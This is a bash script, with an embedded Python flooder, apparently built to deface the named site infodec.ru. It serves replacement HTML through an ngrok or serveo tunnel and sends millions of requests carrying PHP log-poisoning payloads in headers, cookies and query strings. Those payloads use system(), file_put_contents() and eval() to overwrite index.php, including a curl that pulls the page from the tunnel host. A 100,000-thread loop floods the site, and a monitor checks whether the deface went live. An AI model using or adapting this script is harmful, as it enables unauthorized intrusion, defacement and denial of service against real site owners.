#!/bin/bash
# INFODEC_ROOT_FINAL.sh - DIRECT ROOT OVERRIDE https://infodec.ru/ → HTML STATIC
# TARGET: ONLY https://infodec.ru/ (NO /user/, NO IP, DIRECT ROOT PATH)

HTML_FILE="TRUSTEDF57.html"
TARGET="https://infodec.ru/"  # DIRECT ROOT ONLY
echo "💀 INFODEC.RU DIRECT ROOT DEFACE → $TARGET"

# 1. HTML PREP + MINIFY (CRITICO per log payloads)
[ -f "$HTML_FILE" ] || { echo "❌ Crea $HTML_FILE"; exit 1; }

# Ultra-minify HTML per log injection
MINI_HTML=$(cat "$HTML_FILE" | sed 's/^[ \t]*//gm;s/[ \t]*$//gm;s/>[ \t]*</></g;s/\s\+/ /g;s/"/'"'"'/g' | tr -d '\n\r' | sed 's/'\''/\\x27/g')
echo "[+] HTML ready: ${#MINI_HTML} chars → $TARGET"

# 2. LOCAL SERVER + PUBLIC URL
pkill -f "http.server\|ngrok\|serveo" 2>/dev/null || true
sleep 2

python3 -m http.server 8080 --bind 127.0.0.1 >/dev/null 2>&1 &
SERVER_PID=$!
sleep 3

# ngrok tunnel (PRIMARY)
if command -v ngrok >/dev/null 2>&1; then
    nohup ngrok http 8080 > ngrok.log 2>&1 &
    sleep 10
    DEFACE_URL=$(grep -o 'https://[0-9a-z-]*\.ngrok\.io' ngrok.log | head -1 || echo "")
    DEFACE_URL="${DEFACE_URL%/}/$HTML_FILE"
else
    # serveo fallback
    nohup ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > serveo.log 2>&1 &
    sleep 12
    DEFACE_URL=$(grep -o 'https://[0-9a-z-]*\.serveo\.net' serveo.log | head -1 || echo "")
    DEFACE_URL="${DEFACE_URL%/}/$HTML_FILE"
fi

echo "🔗 LIVE PAYLOAD: $DEFACE_URL"
curl -s "$DEFACE_URL" | head -1 || echo "⚠️ Tunnel test"

# 3. MASSIVE DIRECT ROOT ATTACK - 6 VECTORS ON ROOT PATH ONLY

echo "[1/6] VECTOR 1: LOG POISON → index.php OVERWRITE"
POISON_CMD="curl '$DEFACE_URL' -o /var/www/html/index.php"
LOG_PAYLOAD="<?php system('$POISON_CMD');?>"

# 1M shots DIRECT on ROOT
(
  for i in {1..1000000}; do
    curl -s -k -m 3 "$TARGET" \
      -A "$LOG_PAYLOAD" \
      -H "Referer: $LOG_PAYLOAD" \
      -H "X-Forwarded-For: $LOG_PAYLOAD" >/dev/null 2>&1 &
    [ $((i % 50000)) -eq 0 ] && echo "[LOG1] $i"
  done
  wait
) &

echo "[2/6] VECTOR 2: DIRECT HTML IN LOG (NO CURL NEEDED)"
DIRECT_WRITE="echo '$MINI_HTML' > /var/www/html/index.html && mv /var/www/html/index.html /var/www/html/index.php"
DIRECT_PAYLOAD="<?php system('$DIRECT_WRITE');?>"

(
  for i in {1..800000}; do
    curl -s -k -m 2 "$TARGET" \
      -A "$DIRECT_PAYLOAD" \
      -H "Referer: $DIRECT_PAYLOAD" >/dev/null 2>&1 &
    [ $((i % 40000)) -eq 0 ] && echo "[DIRECT] $i"
  done
  wait
) &

echo "[3/6] VECTOR 3: QUERY LOG POISONING"
QUERY_POISON="debug=1&log=<?php%20file_put_contents('/var/www/html/index.php','$MINI_HTML');?>"
(
  for i in {1..600000}; do
    curl -s -k "${TARGET}?${QUERY_POISON}" \
      -A "$LOG_PAYLOAD" >/dev/null 2>&1 &
    [ $((i % 30000)) -eq 0 ] && echo "[QUERY] $i"
  done
  wait
) &

echo "[4/6] VECTOR 4: HEADER COMBO (UA+Cookie+Referer)"
COMBO_PAYLOAD="<?php file_put_contents('/var/www/html/index.php','$MINI_HTML');?>"
(
  for i in {1..500000}; do
    curl -s -k "$TARGET" \
      -A "$COMBO_PAYLOAD" \
      -H "Referer: $COMBO_PAYLOAD" \
      -H "Cookie: PHPSESSID=$COMBO_PAYLOAD" >/dev/null 2>&1 &
  done
  wait
) &

echo "[5/6] VECTOR 5: DOUBLE ENCODED (bypass WAF)"
ENCODED_HTML=$(echo "$MINI_HTML" | sed 's/\\/\\\\\\\\/g;s/%/\\x25/g')
DOUBLE_PAYLOAD="<?php eval(\$_POST[0x70]); \$_POST[0x70]=\"$ENCODED_HTML\";?>"
(
  for i in {1..400000}; do
    curl -s -k -X POST "$TARGET" \
      -d "0x70=$DOUBLE_PAYLOAD" \
      -A "$LOG_PAYLOAD" >/dev/null 2>&1 &
  done
  wait
) &

echo "[6/6] VECTOR 6: MASSIVE SINGLE SHOT (500/sec)"
(
  while true; do
    for p in "$LOG_PAYLOAD" "$DIRECT_PAYLOAD" "$COMBO_PAYLOAD"; do
      curl -s -k "$TARGET" -A "$p" >/dev/null 2>&1 &
    done
    sleep 0.1
  done
) &

echo "🚀 3.3M+ DIRECT ROOT SHOTS - 6 PARALLEL VECTORS → HTML OVERRIDE"

# 4. ULTIMATE PYTHON FLOODER (100K THREADS - ROOT ONLY)
cat > root_defacer.py << 'EOF'
#!/usr/bin/env python3
import requests, threading, time, urllib.parse, sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

deface_url = sys.argv[1] if len(sys.argv)>1 else ""
target = "https://infodec.ru/"
mini_html = sys.argv[2] if len(sys.argv)>2 else ""

poison1 = f"<?php system('curl \"{deface_url}\" -o /var/www/html/index.php');?>"
poison2 = f"<?php file_put_contents('/var/www/html/index.php','{mini_html}');?>"

def root_attack():
    s = requests.Session()
    s.verify = False
    while True:
        try:
            s.get(target, headers={'User-Agent': poison1, 'Referer': poison2}, timeout=1)
            s.get(target+'?debug=1', headers={'User-Agent': poison2}, timeout=1)
            s.post(target, data={'cmd': poison1}, headers={'Cookie': f'pwned={poison2}'}, timeout=1)
        except: pass

print("💀 INFODEC ROOT DEFACER - 100K THREADS")
threads = []
for _ in range(100000):
    t = threading.Thread(target=root_attack, daemon=True)
    t.start()
    threads.append(t)

print(f"🔥 {len(threads)} THREADS → https://infodec.ru/")
while True:
    time.sleep(30)
    print(f"Active: {len(threading.enumerate())} | Check target!")
EOF

chmod +x root_defacer.py
nohup ./root_defacer.py "$DEFACE_URL" "$MINI_HTML" > flood.log 2>&1 &
FLOOD_PID=$!

# 5. MONITOR + CLEANUP SCRIPT
cat > monitor_root.sh << 'EOF'
#!/bin/bash
echo "=== INFODEC.RU ROOT STATUS ($(date)) ==="

# DIRECT ROOT CHECK (MUTLIPLE PATTERNS)
RESPONSE=$(curl -s -k -m 5 "https://infodec.ru/" 2>/dev/null || echo "DOWN")
echo "ROOT ($(echo $RESPONSE | wc -c) bytes):"
echo "$RESPONSE" | head -20
echo "---"

# HTML MARKERS
if echo "$RESPONSE" | grep -qiE "TRUSTED|F57|$(basename $HTML_FILE)"; then
    echo "✅✅✅ ROOT DEFACE LIVE! HTML INJECTED!"
else
    echo "❌ ROOT ancora originale"
fi

# LOG SIZE CHECK (indicatore poisoning)
curl -s -k -I "https://infodec.ru/" 2>&1 | head -3
EOF

chmod +x monitor_root.sh
echo "[+] ./monitor_root.sh  # Esegui ogni 30s"

# AUTO-MONITOR
( while true; do sleep 30; ./monitor_root.sh; echo "----------------------------------------"; done ) &

echo "
💥 ATTACK LAUNCHED → https://infodec.ru/
📊 STATUS:
• 3.3M+ bash shots (6 vettori direct root)
• 100K python threads infiniti  
• Monitor ogni 30s → ./monitor_root.sh

🔍 COMANDI:
watch -n 30 './monitor_root.sh'
tail -f flood.log

Deface HTML apparirà entro 5-15min su https://infodec.ru/ !
"

echo "PIDS attivi: Server=$SERVER_PID | Flood=$FLOOD_PID"
